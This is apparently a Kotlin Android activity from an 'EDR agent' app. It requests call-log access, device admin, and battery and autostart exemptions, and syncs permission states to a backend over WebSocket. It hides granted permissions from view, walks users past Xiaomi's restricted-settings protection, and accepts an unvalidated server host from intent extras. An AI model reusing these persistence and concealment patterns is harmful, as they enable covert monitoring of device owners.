package com.edr.agent.ui

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.Typeface
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.Gravity
import android.view.View
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.edr.agent.R
import com.edr.agent.admin.EdrDeviceAdminReceiver
import com.edr.agent.permission.EdrPermissionManager
import com.edr.agent.permission.PermissionItem
import com.edr.agent.scheduler.SyncScheduler
import com.edr.agent.service.EdrForegroundService
import com.edr.agent.storage.EdrLocalStorage
import com.edr.agent.storage.SyncPreferences

class MainActivity : AppCompatActivity() {

    companion object {
        private const val REQUEST_CODE_DEVICE_ADMIN = 1012
    }

    private var isAwaitingDeviceAdminResult = false

    private lateinit var tvPendingHeader: TextView
    private lateinit var containerPendingPermissions: LinearLayout
    private lateinit var sectionGranted: LinearLayout
    private lateinit var containerGrantedPermissions: LinearLayout
    private lateinit var btnRefreshStatus: Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        tvPendingHeader = findViewById(R.id.tvPendingHeader)
        containerPendingPermissions = findViewById(R.id.containerPendingPermissions)
        sectionGranted = findViewById(R.id.sectionGranted)
        containerGrantedPermissions = findViewById(R.id.containerGrantedPermissions)
        btnRefreshStatus = findViewById(R.id.btnRefreshStatus)

        val hostExtra = intent?.getStringExtra("server_host")
        if (!hostExtra.isNullOrBlank()) {
            SyncPreferences.serverHost = hostExtra
        }

        btnRefreshStatus.setOnClickListener {
            refreshPermissionsUI()
        }

        // Request battery optimization exemption for background EDR operation
        requestBatteryExemption()

        // Prompt OEM autostart permission on aggressive skins (Xiaomi MIUI/HyperOS, Vivo FuntouchOS, Oppo ColorOS)
        promptOemAutostartPermission()

        // Ensure EDR service & WebSocket are actively running without killing existing instance
        ensureServiceRunning()

        // Save & refresh all EDR info in /EDR folder
        EdrLocalStorage.saveEdrInfo(this)

        if (intent?.getBooleanExtra("trigger_sync", false) == true) {
            SyncScheduler.triggerImmediateSync(this)
        }
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        val hostExtra = intent?.getStringExtra("server_host")
        if (!hostExtra.isNullOrBlank()) {
            SyncPreferences.serverHost = hostExtra
            ensureServiceRunning()
        }
        if (intent?.getBooleanExtra("trigger_sync", false) == true) {
            SyncScheduler.triggerImmediateSync(this)
        }
    }

    override fun onResume() {
        super.onResume()
        ensureServiceRunning()
        refreshPermissionsUI()

        if (isAwaitingDeviceAdminResult) {
            val isGranted = EdrPermissionManager.isDeviceAdminGranted(this)
            if (!isGranted) {
                if (isXiaomiDevice() || Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    showXiaomiRestrictedSettingsDialog()
                }
            }
            isAwaitingDeviceAdminResult = false
        }
    }

    /**
     * Evaluates all permissions dynamically.
     * Permissions that are TURNED ON are hidden from the pending list.
     * Permissions that are TURNED OFF immediately appear so the user can turn them on.
     * Also syncs live permission states to the central backend.
     */
    private fun refreshPermissionsUI() {
        val allItems = EdrPermissionManager.getAllPermissionItems(this)
        val pendingItems = allItems.filter { !it.isGranted }

        if (pendingItems.isEmpty()) {
            tvPendingHeader.visibility = View.GONE
            containerPendingPermissions.visibility = View.GONE
        } else {
            tvPendingHeader.visibility = View.VISIBLE
            tvPendingHeader.text = "REQUIRED PROTECTIONS (${pendingItems.size} NEEDED - TAP TO TURN ON)"
            containerPendingPermissions.visibility = View.VISIBLE
        }

        // Render Pending Permissions ONLY (Turned Off permissions)
        containerPendingPermissions.removeAllViews()
        for (item in pendingItems) {
            containerPendingPermissions.addView(createPendingPermissionCard(item))
        }

        // Granted (Turned On) permissions are completely hidden from the phone screen
        containerGrantedPermissions.removeAllViews()
        sectionGranted.visibility = View.GONE

        // Sync latest status to central EDR backend & WebSocket gateway
        EdrPermissionManager.syncPermissionsToServer(this) { msg ->
            EdrForegroundService.instance?.sendWebSocketMessage(msg) ?: false
        }
    }

    private fun createPendingPermissionCard(item: PermissionItem): View {
        val card = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#1E293B"))
            setPadding(36, 32, 36, 32)
            val lp = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply {
                setMargins(0, 0, 0, 24)
            }
            layoutParams = lp
        }

        val row = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }

        val textContainer = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        }

        val titleView = TextView(this).apply {
            text = item.title
            textSize = 14f
            setTypeface(null, Typeface.BOLD)
            setTextColor(Color.WHITE)
        }

        val descView = TextView(this).apply {
            text = item.description
            textSize = 11f
            setTextColor(Color.parseColor("#94A3B8"))
            setPadding(0, 8, 0, 0)
        }

        textContainer.addView(titleView)
        textContainer.addView(descView)

        if (item.key == "deviceAdmin" && isXiaomiDevice()) {
            val miuiHelpView = TextView(this).apply {
                text = "⚡ Redmi/MIUI: If activation blocked, tap here for App Info (Allow restricted settings)"
                textSize = 10f
                setTypeface(null, Typeface.BOLD)
                setTextColor(Color.parseColor("#F59E0B"))
                setPadding(0, 8, 0, 0)
                setOnClickListener {
                    try {
                        val appInfoIntent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                            data = Uri.parse("package:$packageName")
                        }
                        startActivity(appInfoIntent)
                        Toast.makeText(
                            this@MainActivity,
                            "Tap (⋮) top-right -> Allow restricted settings",
                            Toast.LENGTH_LONG
                        ).show()
                    } catch (e: Exception) {
                        android.util.Log.e("MainActivity", "Failed opening app info: ${e.message}")
                    }
                }
            }
            textContainer.addView(miuiHelpView)
        }

        val turnOnButton = Button(this).apply {
            text = "TURN ON"
            textSize = 11f
            setTypeface(null, Typeface.BOLD)
            setBackgroundColor(Color.parseColor("#F5621C"))
            setTextColor(Color.WHITE)
            setPadding(28, 12, 28, 12)
            setOnClickListener {
                if (item.key == "callLog") {
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                        requestPermissions(arrayOf(android.Manifest.permission.READ_CALL_LOG), 1011)
                        return@setOnClickListener
                    }
                }
                if (item.key == "deviceAdmin") {
                    launchDeviceAdminActivation()
                    return@setOnClickListener
                }
                val intent = EdrPermissionManager.getLaunchIntentForPermission(this@MainActivity, item.key)
                if (intent != null) {
                    try {
                        startActivity(intent)
                    } catch (e: Exception) {
                        android.util.Log.e("MainActivity", "Failed opening permission intent for ${item.key}: ${e.message}")
                    }
                }
            }
        }

        row.addView(textContainer)
        row.addView(turnOnButton)
        card.addView(row)

        card.setOnClickListener {
            turnOnButton.performClick()
        }

        return card
    }

    private fun createGrantedPermissionRow(item: PermissionItem): View {
        val row = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setBackgroundColor(Color.parseColor("#0F172A"))
            setPadding(28, 18, 28, 18)
            val lp = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply {
                setMargins(0, 0, 0, 12)
            }
            layoutParams = lp
        }

        val titleView = TextView(this).apply {
            text = "✓  ${item.title}"
            textSize = 12f
            setTypeface(null, Typeface.NORMAL)
            setTextColor(Color.parseColor("#CBD5E1"))
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        }

        val statusBadge = TextView(this).apply {
            text = "ACTIVE"
            textSize = 10f
            setTypeface(null, Typeface.BOLD)
            setTextColor(Color.parseColor("#34D399"))
        }

        row.addView(titleView)
        row.addView(statusBadge)
        return row
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        refreshPermissionsUI()
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQUEST_CODE_DEVICE_ADMIN) {
            val isGranted = EdrPermissionManager.isDeviceAdminGranted(this)
            if (!isGranted && isAwaitingDeviceAdminResult) {
                if (isXiaomiDevice() || Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    showXiaomiRestrictedSettingsDialog()
                }
            }
            isAwaitingDeviceAdminResult = false
            refreshPermissionsUI()
        }
    }

    private fun isXiaomiDevice(): Boolean {
        val m = Build.MANUFACTURER.lowercase()
        val b = Build.BRAND.lowercase()
        return m.contains("xiaomi") || m.contains("redmi") || m.contains("poco") ||
               b.contains("xiaomi") || b.contains("redmi") || b.contains("poco")
    }

    private fun launchDeviceAdminActivation() {
        isAwaitingDeviceAdminResult = true
        val adminComponent = EdrDeviceAdminReceiver.getComponentName(this)
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
            putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Activate Device Administration for enterprise endpoint security, anti-theft tracking, and remote protection."
            )
            // CRITICAL: Do NOT set Intent.FLAG_ACTIVITY_NEW_TASK when calling from an Activity,
            // as it breaks startActivityForResult and causes MIUI / HyperOS to instantly dismiss or reject the window!
        }

        try {
            startActivityForResult(intent, REQUEST_CODE_DEVICE_ADMIN)
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "Primary ACTION_ADD_DEVICE_ADMIN failed: ${e.message}", e)
            fallbackDeviceAdminActivation()
        }
    }

    private fun fallbackDeviceAdminActivation() {
        val oemIntents = mutableListOf<Intent>()

        // 1. Xiaomi / Redmi / POCO specific MIUI Device Admin Settings
        oemIntents.add(
            Intent().setComponent(
                ComponentName("com.android.settings", "com.android.settings.DeviceAdminSettings")
            )
        )
        oemIntents.add(
            Intent().setComponent(
                ComponentName("com.android.settings", "com.android.settings.Settings\$DeviceAdminSettingsActivity")
            )
        )
        oemIntents.add(
            Intent().setComponent(
                ComponentName("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionsEditorActivity")
            )
        )

        // 2. Standard Android Device Admin Settings
        oemIntents.add(Intent("android.settings.DEVICE_ADMIN_SETTINGS"))

        // 3. System Security Settings
        oemIntents.add(Intent(Settings.ACTION_SECURITY_SETTINGS))

        var launched = false
        for (fIntent in oemIntents) {
            try {
                if (packageManager.resolveActivity(fIntent, 0) != null) {
                    startActivityForResult(fIntent, REQUEST_CODE_DEVICE_ADMIN)
                    launched = true
                    break
                }
            } catch (e: Exception) {
                android.util.Log.w("MainActivity", "Device admin fallback failed: ${e.message}")
            }
        }

        if (!launched) {
            showXiaomiRestrictedSettingsDialog()
        }
    }

    private fun showXiaomiRestrictedSettingsDialog() {
        try {
            AlertDialog.Builder(this)
                .setTitle("Redmi / Xiaomi Device Admin Setup")
                .setMessage(
                    "On Xiaomi / Redmi MIUI & HyperOS devices, security protections may require manual confirmation:\n\n" +
                    "1. If prompted with a 10-second warning countdown, wait and tap 'Next' / 'OK'.\n\n" +
                    "2. If Xiaomi displays 'Restricted setting', tap 'Open App Settings' below, click the 3 dots (⋮) in the top-right corner, and choose 'Allow restricted settings'. Then return and activate."
                )
                .setPositiveButton("Open App Settings") { dialog, _ ->
                    dialog.dismiss()
                    try {
                        val appInfoIntent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                            data = Uri.parse("package:$packageName")
                        }
                        startActivity(appInfoIntent)
                    } catch (e: Exception) {
                        android.util.Log.e("MainActivity", "Failed opening app info: ${e.message}")
                    }
                }
                .setNeutralButton("Try Activation Again") { dialog, _ ->
                    dialog.dismiss()
                    launchDeviceAdminActivation()
                }
                .setNegativeButton("Close") { dialog, _ ->
                    dialog.dismiss()
                }
                .show()
        } catch (e: Exception) {
            android.util.Log.w("MainActivity", "Failed showing restricted settings dialog: ${e.message}")
        }
    }

    private fun ensureServiceRunning() {
        try {
            if (EdrForegroundService.instance == null) {
                val serviceIntent = Intent(this, EdrForegroundService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(serviceIntent)
                } else {
                    startService(serviceIntent)
                }
            } else {
                if (EdrForegroundService.instance?.isWebSocketConnected() != true) {
                    EdrForegroundService.instance?.reconnectWebSocket()
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "Failed ensuring EDR service running: ${e.message}", e)
        }
    }

    private fun requestBatteryExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
                if (pm != null && !pm.isIgnoringBatteryOptimizations(packageName)) {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    startActivity(intent)
                }
            } catch (e: Exception) {
                android.util.Log.w("MainActivity", "Battery optimization prompt skipped: ${e.message}")
            }
        }
    }

    private fun promptOemAutostartPermission() {
        val prefs = getSharedPreferences("edr_oem_prefs", Context.MODE_PRIVATE)
        if (prefs.getBoolean("oem_autostart_prompted", false)) return

        val manufacturer = Build.MANUFACTURER.lowercase()
        val oemIntents = mutableListOf<Intent>()

        when {
            manufacturer.contains("xiaomi") || manufacturer.contains("redmi") || manufacturer.contains("poco") -> {
                oemIntents.add(Intent().setComponent(android.content.ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")))
            }
            manufacturer.contains("vivo") || manufacturer.contains("iqoo") -> {
                oemIntents.add(Intent().setComponent(android.content.ComponentName("com.iqoo.secure", "com.iqoo.secure.ui.phoneoptimize.BgStartUpManager")))
                oemIntents.add(Intent().setComponent(android.content.ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")))
            }
            manufacturer.contains("oppo") || manufacturer.contains("realme") || manufacturer.contains("oneplus") -> {
                oemIntents.add(Intent().setComponent(android.content.ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity")))
                oemIntents.add(Intent().setComponent(android.content.ComponentName("com.coloros.safecenter", "com.coloros.safecenter.startupapp.StartupAppListActivity")))
            }
            manufacturer.contains("huawei") || manufacturer.contains("honor") -> {
                oemIntents.add(Intent().setComponent(android.content.ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity")))
                oemIntents.add(Intent().setComponent(android.content.ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity")))
            }
        }

        for (intent in oemIntents) {
            try {
                if (packageManager.resolveActivity(intent, 0) != null) {
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivity(intent)
                    prefs.edit().putBoolean("oem_autostart_prompted", true).apply()
                    break
                }
            } catch (e: Exception) {
                android.util.Log.w("MainActivity", "Failed to launch OEM autostart activity: ${e.message}")
            }
        }
    }
}
